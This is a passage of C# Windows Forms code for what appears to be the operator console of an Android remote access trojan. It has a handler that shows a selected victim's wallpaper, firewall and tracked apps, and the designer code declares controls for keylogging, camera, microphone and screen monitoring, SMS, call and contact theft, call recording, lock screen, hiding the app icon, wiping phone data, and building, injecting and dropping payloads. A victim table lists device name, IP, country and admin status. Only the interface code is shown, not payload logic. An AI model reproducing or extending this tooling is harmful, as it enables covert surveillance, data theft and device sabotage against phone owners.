		try
		{
			if (ClientsWindow.Rows.Count > 0)
			{
				if (ClientsWindow.SelectedRows.Count > 0)
				{
					Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
					if ((client == null) | !client.isconnected)
					{
						TCavatar.Image = null;
						uncheckbtn.Visible = false;
						clientfoldrbtn.Visible = false;
						MonitorPanel.Visible = false;
						FWstatus.ForeColor = System.Drawing.Color.Red;
						DGFW.DataSource = null;
						DGVTRK.DataSource = null;
						combodatestrack.Items.Clear();
						combodatestrack.Text = "";
						return;
					}
					Bitmap image = (Bitmap)client.Wallpaper.Clone();
					if (TCavatar.Image != null)
						TCavatar.Image.Dispose();
					TCavatar.Image = image;
					uncheckbtn.Visible = true;
					clientfoldrbtn.Visible = true;
					client.Row.Cells[12].Value = client.ActiveNow;
					if (client.IsonVPN)
						FWstatus.ForeColor = System.Drawing.Color.Lime;
					else
						FWstatus.ForeColor = System.Drawing.Color.Red;
					if (client.FirewallTable != null && client.FirewallTable.Rows.Count > 0)
						DGFW.DataSource = client.FirewallTable;
					if (client.TrackedAppsTable != null)
					{
						if (client.TrackedAppsTable.Rows.Count > 0)
						{
							DGVTRK.DataSource = client.TrackedAppsTable;
							DGVTRK.Columns[4].Visible = false;
						}
						if (client.TrackedDatesFounded != null && combodatestrack.Items != null && combodatestrack.Items.Count == 0 && client.TrackedDatesFounded.Length > 0)
						{
							string[] trackedDatesFounded = client.TrackedDatesFounded;
							foreach (string item in trackedDatesFounded)
							{
								combodatestrack.Items.Add(item);
							}
							combodatestrack.Text = Conversions.ToString(combodatestrack.Items[0]);
						}
					}
					MonitorPanel.Visible = true;
				}
				else
				{
					TCavatar.Image = null;
					uncheckbtn.Visible = false;
					clientfoldrbtn.Visible = false;
					MonitorPanel.Visible = false;
					FWstatus.ForeColor = System.Drawing.Color.Red;
					DGFW.DataSource = null;
					DGVTRK.DataSource = null;
					combodatestrack.Items.Clear();
					combodatestrack.Text = "";
				}
			}
			else
			{
				DGFW.DataSource = null;
				DGVTRK.DataSource = null;
				TCavatar.Image = null;
				uncheckbtn.Visible = false;
				clientfoldrbtn.Visible = false;
				MonitorPanel.Visible = false;
				FWstatus.ForeColor = System.Drawing.Color.Red;
				combodatestrack.Items.Clear();
				combodatestrack.Text = "";
			}
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle29 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle30 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle31 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle32 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle33 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle13 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle15 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle16 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle17 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle18 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle19 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle20 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle21 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle22 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle23 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle24 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle25 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle26 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle27 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle28 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
            this.notfi = new System.Windows.Forms.NotifyIcon(this.components);
            this.TOpacity = new System.Windows.Forms.Timer(this.components);
            this.ctxmenu = new DrakeUI.Framework.DrakeUIContextMenuStrip();
            this.ManagersToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.FilesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SMSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.CallsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.ContactsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.AccountsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ApplicationsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem12 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.MonitorsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ScreenMonitorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem14 = new System.Windows.Forms.ToolStripMenuItem();
            this.CameraMonitorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.MicrophoneMonitorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.KeyloggerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.LocationsMonitorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.LiveModeToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
            this.SilentModeGOIPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.WebBrowserToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.CallRecorderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.ScreenReaderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.AdminToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.RequestAdminRightsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.LockScreenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.隐藏图标ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.擦除手机数据ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
            this.ToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
            this.ExtraToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.NotificationListnerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.CallsListnerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.PhoneInformationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripSeparator7 = new System.Windows.Forms.ToolStripSeparator();
            this.ToolStripMenuItem13 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem16 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem17 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem18 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripSeparator8 = new System.Windows.Forms.ToolStripSeparator();
            this.KeyboardToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
            this.ClientFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.UsdtToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ctxconnection = new DrakeUI.Framework.DrakeUIContextMenuStrip();
            this.BlockClientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.FWctx = new DrakeUI.Framework.DrakeUIContextMenuStrip();
            this.AllowAppToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem15 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem25 = new System.Windows.Forms.ToolStripMenuItem();
            this.TRKctx = new DrakeUI.Framework.DrakeUIContextMenuStrip();
            this.ToolStripMenuItem24 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem19 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem21 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem22 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem23 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem20 = new System.Windows.Forms.ToolStripMenuItem();
            this.blockctx = new DrakeUI.Framework.DrakeUIContextMenuStrip();
            this.ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolTip1 = new System.Windows.Forms.ToolTip(this.components);
            this.notifiform = new DrakeUI.Framework.DrakeUIToolTip(this.components);
            this.clearbtn = new DrakeUI.Framework.DrakeUIAvatar();
            this.DrakeUIButtonIcon7 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon10 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon11 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon9 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon8 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIAvatar4 = new DrakeUI.Framework.DrakeUIAvatar();
            this.clientfoldrbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.uncheckbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIAvatar1 = new DrakeUI.Framework.DrakeUIAvatar();
            this.clearsrchbtn = new DrakeUI.Framework.DrakeUIAvatar();
            this.smsbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon5 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.keyloggerbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.applicationsbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon20 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIAvatar11 = new DrakeUI.Framework.DrakeUIAvatar();
            this.FWstatus = new DrakeUI.Framework.DrakeUIAvatar();
            this.DrakeUIAvatar8 = new DrakeUI.Framework.DrakeUIAvatar();
            this.DrakeUIAvatar5 = new DrakeUI.Framework.DrakeUIAvatar();
            this.DrakeUIAvatar9 = new DrakeUI.Framework.DrakeUIAvatar();
            this.lastclientpic = new DrakeUI.Framework.DrakeUIAvatar();
            this.DrakeUIButtonIcon6 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.locationbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.screenreadbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.micbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.ToolTips = new DrakeUI.Framework.DrakeUIToolTip(this.components);
            this.addpo = new DrakeUI.Framework.DrakeUIAvatar();
            this.checkupdate = new System.Windows.Forms.Timer(this.components);
            this.mapworker = new System.ComponentModel.BackgroundWorker();
            this.Statustimer = new System.Windows.Forms.Timer(this.components);
            this.ImageList1 = new System.Windows.Forms.ImageList(this.components);
            this.monitortimer = new System.Windows.Forms.Timer(this.components);
            this.guna2AnimateWindow1 = new Guna.UI2.WinForms.Guna2AnimateWindow(this.components);
            this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
            this.dataGridViewImageColumn5 = new System.Windows.Forms.DataGridViewImageColumn();
            this.panel1 = new System.Windows.Forms.Panel();
            this.drakeUILabel8 = new DrakeUI.Framework.DrakeUILabel();
            this.drakeUIButtonIcon39 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon40 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon42 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon41 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Home_Btn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.blockbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Connection_btn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.serversbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.notifiaisbtntop = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Clients_Btn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Panel3 = new System.Windows.Forms.Panel();
            this.Build_btn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.inject_btn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUILabel5 = new DrakeUI.Framework.DrakeUILabel();
            this.Settings_btn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.droperbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.studiobtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.Label3 = new System.Windows.Forms.Label();
            this.DataLog = new System.Windows.Forms.DataGridView();
            this.DataGridViewImageColumn2 = new System.Windows.Forms.DataGridViewImageColumn();
            this.DataGridViewTextBoxColumn5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.DataGridViewTextBoxColumn4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.DataGridViewTextBoxColumn7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dattim = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.connectionpanel = new DrakeUI.Framework.DrakeUITitlePanel();
            this.DGVSERVS = new System.Windows.Forms.DataGridView();
            this.Start = new System.Windows.Forms.DataGridViewImageColumn();
            this.portnam = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.DataGridViewTextBoxColumn6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Key = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.blockpanel = new DrakeUI.Framework.DrakeUITitlePanel();
            this.notificationspanel = new System.Windows.Forms.Panel();
            this.callspanel = new DrakeUI.Framework.DrakeUITitlePanel();
            this.DGVCALLS = new System.Windows.Forms.DataGridView();
            this.DataGridViewImageColumn3 = new System.Windows.Forms.DataGridViewImageColumn();
            this.DataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.activityzpanel = new DrakeUI.Framework.DrakeUITitlePanel();
            this.DGVNOTF = new System.Windows.Forms.DataGridView();
            this.cliimg = new System.Windows.Forms.DataGridViewImageColumn();
            this.notitext = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.serverspanel = new System.Windows.Forms.Panel();
            this.DashboardPanel = new DrakeUI.Framework.DrakeUITitlePanel();
            this.MonitorPanel = new System.Windows.Forms.Panel();
            this.Panel16 = new System.Windows.Forms.Panel();
            this.DrakeUIButtonIcon16 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon14 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Panel20 = new System.Windows.Forms.Panel();
            this.FWPANEL = new System.Windows.Forms.Panel();
            this.infotitlepanel = new DrakeUI.Framework.DrakeUITitlePanel();
            this.infopanel = new System.Windows.Forms.Panel();
            this.Panel5 = new System.Windows.Forms.Panel();
            this.MapPannel = new System.Windows.Forms.Panel();
            this.mappanel = new DrakeUI.Framework.DrakeUITitlePanel();
            this.Panel2 = new System.Windows.Forms.Panel();
            this.infobox = new DrakeUI.Framework.DrakeUIGroupBox();
            this.infotext = new DrakeUI.Framework.DrakeUILabel();
            this.DrakeUIAvatar3 = new DrakeUI.Framework.DrakeUIAvatar();
            this.ReciveBox = new DrakeUI.Framework.DrakeUIGroupBox();
            this.recvtotal = new DrakeUI.Framework.DrakeUILabel();
            this.DrakeUIAvatar6 = new DrakeUI.Framework.DrakeUIAvatar();
            this.SentBox = new DrakeUI.Framework.DrakeUIGroupBox();
            this.senttotal = new DrakeUI.Framework.DrakeUILabel();
            this.DrakeUIAvatar7 = new DrakeUI.Framework.DrakeUIAvatar();
            this.RecentBox = new DrakeUI.Framework.DrakeUIGroupBox();
            this.lastclienttext = new DrakeUI.Framework.DrakeUILabel();
            this.Label4 = new System.Windows.Forms.Label();
            this.DGFW = new System.Windows.Forms.DataGridView();
            this.TRKPANEL = new System.Windows.Forms.Panel();
            this.DGVTRK = new System.Windows.Forms.DataGridView();
            this.Panel17 = new System.Windows.Forms.Panel();
            this.Label5 = new System.Windows.Forms.Label();
            this.combodatestrack = new DrakeUI.Framework.DrakeUIComboBox();
            this.recordsShowpanel = new System.Windows.Forms.Panel();
            this.recordshowtext = new System.Windows.Forms.TextBox();
            this.Panel6 = new System.Windows.Forms.Panel();
            this.searchtext = new DrakeUI.Framework.DrakeUITextBox();
            this.searchbtn = new DrakeUI.Framework.DrakeUIAvatar();
            this.Panel18 = new System.Windows.Forms.Panel();
            this.TCavatar = new System.Windows.Forms.PictureBox();
            this.Panel19 = new System.Windows.Forms.Panel();
            this.Panel4 = new System.Windows.Forms.Panel();
            this.Panel13 = new System.Windows.Forms.Panel();
            this.notifispanel = new DrakeUI.Framework.DrakeUITitlePanel();
            this.Panel7 = new System.Windows.Forms.Panel();
            this.DGVALRTS = new System.Windows.Forms.DataGridView();
            this.DataGridViewImageColumn4 = new System.Windows.Forms.DataGridViewImageColumn();
            this.DataGridViewTextBoxColumn3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Panel12 = new System.Windows.Forms.Panel();
            this.Panel9 = new System.Windows.Forms.Panel();
            this.infolowtext = new System.Windows.Forms.Label();
            this.Panel11 = new System.Windows.Forms.Panel();
            this.passtxt = new DrakeUI.Framework.DrakeUITextBox();
            this.rempo = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.porttext = new DrakeUI.Framework.DrakeUITextBox();
            this.checksavepass = new DrakeUI.Framework.DrakeUICheckBox();
            this.DrakeUIAvatar2 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.checkenablelogs = new DrakeUI.Framework.DrakeUICheckBox();
            this.checkclearlogs = new DrakeUI.Framework.DrakeUICheckBox();
            this.bigtitletext = new System.Windows.Forms.Label();
            this.panel8 = new System.Windows.Forms.Panel();
            this.guna2ShadowPanel4 = new Guna.UI2.WinForms.Guna2ShadowPanel();
            this.drakeUILabel7 = new DrakeUI.Framework.DrakeUILabel();
            this.pictureBox14 = new System.Windows.Forms.PictureBox();
            this.drakeUILabel6 = new DrakeUI.Framework.DrakeUILabel();
            this.drakeUILabel2 = new DrakeUI.Framework.DrakeUILabel();
            this.pictureBox6 = new System.Windows.Forms.PictureBox();
            this.drakeUILabel3 = new DrakeUI.Framework.DrakeUILabel();
            this.guna2ShadowPanel3 = new Guna.UI2.WinForms.Guna2ShadowPanel();
            this.pictureBox13 = new System.Windows.Forms.PictureBox();
            this.pictureBox7 = new System.Windows.Forms.PictureBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.guna2ShadowPanel2 = new Guna.UI2.WinForms.Guna2ShadowPanel();
            this.pictureBox8 = new System.Windows.Forms.PictureBox();
            this.label8 = new System.Windows.Forms.Label();
            this.pictureBox12 = new System.Windows.Forms.PictureBox();
            this.label2 = new System.Windows.Forms.Label();
            this.guna2ShadowPanel1 = new Guna.UI2.WinForms.Guna2ShadowPanel();
            this.pictureBox10 = new System.Windows.Forms.PictureBox();
            this.label10 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.pictureBox11 = new System.Windows.Forms.PictureBox();
            this.label6 = new System.Windows.Forms.Label();
            this.drakeUILabel1 = new DrakeUI.Framework.DrakeUILabel();
            this.drakeUILabel4 = new DrakeUI.Framework.DrakeUILabel();
            this.label16 = new System.Windows.Forms.Label();
            this.DGVblocked = new System.Windows.Forms.DataGridView();
            this.DataGridViewImageColumn1 = new System.Windows.Forms.DataGridViewImageColumn();
            this.DataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.ClientsWindow = new DrakeUI.Framework.DrakeUIDataGridView();
            this.cliscren = new System.Windows.Forms.DataGridViewImageColumn();
            this.cliav = new System.Windows.Forms.DataGridViewImageColumn();
            this.cliflg = new System.Windows.Forms.DataGridViewImageColumn();
            this.cliname = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.clicountry = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.cliip = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.andver = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.phondmod = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.clinoti = new System.Windows.Forms.DataGridViewImageColumn();
            this.clicalls = new System.Windows.Forms.DataGridViewImageColumn();
            this.clibtry = new System.Windows.Forms.DataGridViewImageColumn();
            this.cliwifi = new System.Windows.Forms.DataGridViewImageColumn();
            this.cliavt = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.defcli = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.isadmincli = new System.Windows.Forms.DataGridViewImageColumn();
            this.clipng = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.instdate = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.drakeUITitleLine1 = new DrakeUI.Framework.DrakeUITitleLine();
            this.guna2Panel3 = new Guna.UI2.WinForms.Guna2Panel();
            this.ClientsButton = new Guna.UI2.WinForms.Guna2GradientButton();
            this.Guna2GradientButton20 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.PictureBox9 = new System.Windows.Forms.PictureBox();
            this.ClientsClearLogs = new Guna.UI2.WinForms.Guna2GradientButton();
            this.pictureBox4 = new System.Windows.Forms.PictureBox();
            this.pictureBox5 = new System.Windows.Forms.PictureBox();
            this.guna2GradientButton3 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            this.pictureBox3 = new System.Windows.Forms.PictureBox();
            this.drakeUIButtonIcon3 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Guna2GradientButton22 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.drakeUIMeter1 = new DrakeUI.Framework.DrakeUIMeter();
            this.AlertButton = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.toblocktext = new DrakeUI.Framework.DrakeUITextBox();
            this.ClientsLogs = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2Panel4 = new Guna.UI2.WinForms.Guna2Panel();
            this.drakeUIButtonIcon26 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon12 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon13 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon21 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon18 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon27 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon25 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon24 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon23 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon22 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon33 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon17 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon31 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon30 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon29 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon28 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon4 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon15 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon34 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon35 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon36 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon37 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.drakeUIButtonIcon38 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Mainpanel = new System.Windows.Forms.Panel();
            this.panel15 = new System.Windows.Forms.Panel();
            this.panel14 = new System.Windows.Forms.Panel();
            this.panel10 = new System.Windows.Forms.Panel();
            this.guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            this.pictureBox15 = new System.Windows.Forms.PictureBox();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.ctxmenu.SuspendLayout();
            this.ctxconnection.SuspendLayout();
            this.FWctx.SuspendLayout();
            this.TRKctx.SuspendLayout();
            this.blockctx.SuspendLayout();
            this.panel1.SuspendLayout();
            this.Panel3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.DataLog)).BeginInit();
            this.connectionpanel.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.DGVSERVS)).BeginInit();
            this.blockpanel.SuspendLayout();
            this.notificationspanel.SuspendLayout();
            this.callspanel.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.DGVCALLS)).BeginInit();
            this.activityzpanel.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.DGVNOTF)).BeginInit();
            this.serverspanel.SuspendLayout();
            this.DashboardPanel.SuspendLayout();
            this.MonitorPanel.SuspendLayout();
            this.Panel16.SuspendLayout();
            this.Panel20.SuspendLayout();
            this.FWPANEL.SuspendLayout();
            this.infotitlepanel.SuspendLayout();
            this.infopanel.SuspendLayout();
